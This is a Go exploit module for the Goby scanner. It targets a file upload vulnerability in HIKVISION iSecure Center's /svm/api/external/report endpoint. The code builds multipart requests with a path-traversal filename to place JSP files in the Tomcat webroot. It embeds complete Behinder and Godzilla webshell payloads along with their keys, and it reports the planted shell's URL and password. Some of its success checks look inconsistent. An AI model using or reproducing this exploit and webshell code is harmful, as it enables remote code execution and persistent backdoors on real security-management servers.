package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "HIKVISION iSecure Center svm/api/external/report interface file upload vulnerability",
    "Description": "<p>The comprehensive security management platform iSecure Center provides capabilities in video, all-in-one card, parking lot, face application, event service, alarm detection, temperature measurement application, etc.</p><p>Attackers exploit file upload vulnerabilities to upload malicious files to target systems. These files can execute arbitrary code, create backdoors, and compromise the security of the entire system.</p>",
    "Product": "HIKVISION-iSecure-Center",
    "Homepage": "https://www.hikvision.com/",
    "DisclosureDate": "2023-08-09",
    "PostTime": "2023-10-26",
    "Author": "1691834629@qq.com",
    "FofaQuery": "title=\"综合安防管理平台\" || body=\"commonVar.js\" || body=\"nstallRootCert.exe\" || header=\"portal:8082\" || banner=\"portal:8082\" || cert=\"ga.hikvision.com\" || body=\"error/browser.do\" || body=\"InstallRootCert.exe\" || body=\"error/browser.do\" || body=\"2b73083e-9b29-4005-a123-1d4ec47a36d5\" || cert=\"ivms8700\" || title=\"iVMS-\" || body=\"code-iivms\" || body=\"g_szCacheTime\" || body=\"getExpireDateOfDays.action\" || body=\"//caoshiyan modify 2015-06-30 中转页面\" || body=\"/home/locationIndex.action\" || body=\"laRemPassword\" || body=\"LoginForm.EhomeUserName.value\" || (body=\"laCurrentLanguage\" && body=\"iVMS\") || header=\"Server: If you want know, you can ask me\" || banner=\"Server: If you want know, you can ask me\" || body=\"download/iVMS-\" || body=\"if (refreshurl == null || refreshurl == '') { window.location.reload();}\" || header=\"EPORTAL_JSESSIONID\" || banner=\"EPORTAL_JSESSIONID\"",
    "GobyQuery": "title=\"综合安防管理平台\" || body=\"commonVar.js\" || body=\"nstallRootCert.exe\" || header=\"portal:8082\" || banner=\"portal:8082\" || cert=\"ga.hikvision.com\" || body=\"error/browser.do\" || body=\"InstallRootCert.exe\" || body=\"error/browser.do\" || body=\"2b73083e-9b29-4005-a123-1d4ec47a36d5\" || cert=\"ivms8700\" || title=\"iVMS-\" || body=\"code-iivms\" || body=\"g_szCacheTime\" || body=\"getExpireDateOfDays.action\" || body=\"//caoshiyan modify 2015-06-30 中转页面\" || body=\"/home/locationIndex.action\" || body=\"laRemPassword\" || body=\"LoginForm.EhomeUserName.value\" || (body=\"laCurrentLanguage\" && body=\"iVMS\") || header=\"Server: If you want know, you can ask me\" || banner=\"Server: If you want know, you can ask me\" || body=\"download/iVMS-\" || body=\"if (refreshurl == null || refreshurl == '') { window.location.reload();}\" || header=\"EPORTAL_JSESSIONID\" || banner=\"EPORTAL_JSESSIONID\"",
    "Level": "3",
    "Impact": "<p>Attackers exploit file upload vulnerabilities to upload malicious files onto a target system. These files can execute arbitrary code, establish backdoors, and compromise the security of the entire system.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.hikvision.com/\">https://www.hikvision.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test.txt",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "test",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "HIKVISION iSecure Center svm/api/external/report 接口文件上传漏洞",
            "Product": "HIKVISION-iSecure-Center",
            "Description": "<p>综合安防管理平台 iSecure Center 提供了视频、一卡通、停车场、人脸应用、事件服务、报警检测、测温应用等方面的能力开放。</p><p>攻击者利用文件上传漏洞将恶意文件上传到目标系统。这些文件可以执行任意代码、建立后门，并危害整个系统的安全性。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.hikvision.com/\" target=\"_blank\">https://www.hikvision.com/</a></p>",
            "Impact": "<p>攻击者利用文件上传漏洞将恶意文件上传到目标系统。这些文件可以执行任意代码、建立后门，并危害整个系统的安全性。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "HIKVISION iSecure Center svm/api/external/report interface file upload vulnerability",
            "Product": "HIKVISION-iSecure-Center",
            "Description": "<p>The comprehensive security management platform iSecure Center provides capabilities in video, all-in-one card, parking lot, face application, event service, alarm detection, temperature measurement application, etc.</p><p>Attackers exploit file upload vulnerabilities to upload malicious files to target systems. These files can execute arbitrary code, create backdoors, and compromise the security of the entire system.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.hikvision.com/\">https://www.hikvision.com/</a><br></p>",
            "Impact": "<p>Attackers exploit file upload vulnerabilities to upload malicious files onto a target system. These files can execute arbitrary code, establish backdoors, and compromise the security of the entire system.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10816"
}`

	sendShell34sdfwe := func(hostInfo *httpclient.FixUrl, fileName, content, url string) (*httpclient.HttpResponse, error) {
		var cfg *httpclient.RequestConfig
		if fileName == "" {
			cfg = httpclient.NewGetRequestConfig(url)
		} else {
			cfg = httpclient.NewPostRequestConfig(url)
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a")
			cfg.Data = fmt.Sprintf("------WebKitFormBoundary9PggsiM755PLa54a\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\nContent-Type: application/zip\r\n\r\n%s\r\n------WebKitFormBoundary9PggsiM755PLa54a--", fileName, content)
		}
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return resp, err
		}
		return resp, err
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			fileName := goutils.RandomHexString(6)
			fileName += ".jsp"
			trueName := "../../../tomcat85linux64.1/webapps/els/static/" + fileName
			if resp, err := sendShell34sdfwe(hostInfo, trueName, "<% out.println(\"ByTestZsf323408hfj0486\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>", "/svm/api/external/report"); err == nil {
				if resp.StatusCode == 200 {
					if resp1, err := sendShell34sdfwe(hostInfo, "", "", "/els/static/"+fileName); err == nil {
						return resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "ByTestZsf323408hfj0486")
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			content := goutils.B2S(ss.Params["content"])
			if attackType == "webshell" {
				webShell := goutils.B2S(ss.Params["webshell"])
				if webShell == "behinder" {
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webShell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>`
				}
				fileName := goutils.RandomHexString(6)
				fileName += ".jsp"
				trueName := "../../../tomcat85linux64.1/webapps/els/static/" + fileName
				if resp, err := sendShell34sdfwe(expResult.HostInfo, trueName, content, "/svm/api/external/report"); err == nil {
					expResult.Success = resp.StatusCode == 200 && strings.Contains(resp.RawBody, "0x26e31402")
					expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/els/static/" + fileName + "\n"
					if attackType != "custom" && webShell == "behinder" {
						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
					} else if attackType != "custom" && webShell == "godzilla" {
						expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.1\n"
					} else {
						fmt.Println("no")
					}
					expResult.Output += "Webshell type: jsp"
				} else {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "custom" {
				fileName := goutils.B2S(ss.Params["filename"])
				trueName := "../../../tomcat85linux64.1/webapps/els/static/" + fileName
				if resp, err := sendShell34sdfwe(expResult.HostInfo, trueName, content, "/svm/api/external/report"); err == nil {
					if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "0x26e31402") {
						expResult.Success = true
						expResult.Output = "漏洞利用成功\n"
						expResult.Output += "File URL: " + expResult.HostInfo.FixedHostInfo + "/els/static/" + fileName + "\n"
					} else {
						expResult.Success = false
						expResult.Output = "漏洞利用失败"
					}
				}
			}
			return expResult
		},
	))
}
